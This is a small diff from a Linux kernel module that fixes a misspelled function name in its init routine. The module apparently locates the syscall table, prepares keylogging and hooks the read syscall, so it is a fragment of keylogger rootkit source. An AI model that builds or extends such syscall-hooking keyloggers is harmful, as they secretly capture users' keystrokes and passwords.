@@ -18,7 +18,7 @@ static int __init mod_init(void)
     printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
   else return 0;
 
-  perpare_keylogging();
+  prepare_keylogging();
   hook_read(sct);
   return 0;
 }
